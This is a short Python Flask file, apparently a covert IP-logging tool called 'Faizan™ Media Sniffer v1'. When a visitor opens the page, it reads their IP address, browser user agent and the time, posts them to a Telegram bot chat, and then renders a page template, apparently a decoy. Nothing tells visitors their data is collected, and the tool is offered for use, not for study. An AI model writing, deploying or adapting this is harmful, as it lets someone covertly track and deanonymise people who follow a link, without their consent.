from flask import Flask, request, render_template
from datetime import datetime
import requests

app = Flask(__name__)

# Your Telegram Bot Info
BOT_TOKEN = "YOUR_BOT_TOKEN"
CHAT_ID = "YOUR_CHAT_ID"

def send_telegram(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    try:
        requests.post(url, data=data)
    except Exception as e:
        print("Telegram error:", e)

@app.route('/')
def sniff():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Unknown')
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    message = f"""📡 *Faizan™ Media Sniffer v1 Activated*

🕰️ Time: {now}
🌐 IP: {ip}
📱 Device: {user_agent}
"""

    send_telegram(message)
    return render_template("sniff.html")
